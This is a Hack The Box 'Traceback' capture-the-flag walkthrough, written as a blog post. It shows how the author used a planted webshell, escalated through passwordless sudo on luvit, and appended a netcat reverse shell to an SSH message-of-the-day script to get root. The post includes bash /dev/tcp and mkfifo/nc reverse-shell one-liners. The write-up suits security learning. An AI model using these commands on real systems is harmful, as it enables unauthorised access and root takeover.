@@ -1,0 +1,96 @@
+<p class="lead"><strong><em>“Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.”</em></strong> - Chanda Kochhar</p>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/machine.jpeg" alt="" /></p>
+
+<h2 id="machine-matrix">Machine Matrix</h2>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/matrix.png" alt="" /></p>
+
+<h2 id="machine-summary">Machine Summary</h2>
+<p>Box is a linux machine that has a webserver running which is backdoored with a webshell. Upon getting the shell with webadmin access, privilege escalation to sysadmin can be done with misconfigured permissions of executing <strong>luvit</strong> i.e luvit can be executed as sysadmin without the password. On a successfull login onto the ssh, /etc/update-motd.d/ gets executed with root privilege, rewritting a file in it with reverse shell would grant us the root privilege.</p>
+
+<h2 id="nmap-scan">Nmap Scan</h2>
+<p>I started the enumeration with nmap scan</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.181
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/1.png" alt="" /></p>
+
+<p>The box had two ports open
+| Port         | Service           |
+|:————-|:——————|
+| 22           | SSH               |
+| 80           | Apache            |</p>
+
+<h2 id="enumeration-on-port-80">Enumeration on port 80</h2>
+<p>I started to enumerate on the webserver, it said “This site has been owned I have left a backdoor for all the net. FREE INTERNETZZZ -Xh4H- “</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/2.png" alt="" /></p>
+
+<p>Viewing the source of the page gave me a hint about the web shells, so i went on to search about Xh4H related to webshells on google</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/3.png" alt="" /></p>
+
+<h2 id="acquiring-initial-foothold-webadmin">Acquiring Initial Foothold (Webadmin)</h2>
+<p>I found the web-shells repository of Xh4H, i tried putting all the web-shells in the repository on the url (http://10.10.10.181)</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/4.png" alt="" /></p>
+
+<p>At last, found that smevk.php is the web-shell that has been backdoored on the machine.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/5.png" alt="" /></p>
+
+<p>The webshell has username and password as “admin” that i found on viewing the source of the webshell smevk.php</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/6.png" alt="" /></p>
+
+<p>To grant me the full fleged shell, i decided to upload a bash script that could grant me a proper shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/<span class="o">{</span>IP<span class="o">}</span>/<span class="o">{</span>PORT<span class="o">}</span> 0&gt;&amp;1
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/7.png" alt="" /></p>
+
+<h2 id="acquiring-user-shell-sysadmin">Acquiring User Shell (Sysadmin)</h2>
+<p>I have the shell as webadmin, now i need to enumerate and esaclate my privileges to a user. Upon enumeration, i found that no password is required to execute /home sysadmin/luvit using the command</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/8.png" alt="" /></p>
+
+<p>Upon googling some time, i made a command that can grant me a shell as sysadmin</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit <span class="nt">-e</span> <span class="s1">'os.execute("/bin/sh")'</span>
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/9.png" alt="" /></p>
+
+<p>I got the user, moving on to the getting the root</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/10.png" alt="" /></p>
+
+<p>Now i started to enumerate on the privileges of sysadmin that can be the way for root privilege escalation. Manual enumeration didnt work it out for me, so i ran linpeas but that also didnt work out. So i decided to monitor the processes that are running using pspy. I added my ssh public key in the on sysadmin/.ssh authorized_keys and transfered the pspy64 to the machine.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/11.png" alt="" /></p>
+
+<h2 id="acquiring-root-shell">Acquiring Root Shell</h2>
+<p>I found that /etc/update-motd.d/ gets modified and executed each time when a user logs in through ssh</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/12.png" alt="" /></p>
+
+<p>I also confirmed that /etc/update-motd.d/ has files that are writable by the user sysadmin</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /etc <span class="nt">-writable</span>
+</code></pre></div></div>
+<p>I enumerated on the directory it had 4 files</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/update-motd.d/10-help-text
+/etc/update-motd.d/91-release-upgrade
+/etc/update-motd.d/00-header
+/etc/update-motd.d/80-esm
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/14.png" alt="" /></p>
+
+<p>I decided to have a bash script on /etc/update-motd.d/00-header so i added rev-shell using the command</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1'"</span> <span class="o">&gt;&gt;</span> /etc/update-motd.d/00-header 
+</code></pre></div></div>
+<p>Now i logged on to ssh in a new tab with a listener on other tab hopping to get reverse connection but that didnt worked out. Upon researching i found that the modification that we made to the file isn’t properly getting safed.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.158 9090 &gt; /tmp/m"</span> <span class="o">&gt;&gt;</span> /etc/update-motd.d/00-header
+</code></pre></div></div>
+<p>I got the reverse shell with root privileges</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/15.png" alt="" /></p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/16.png" alt="" /></p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/pwned.png" alt="" /></p>
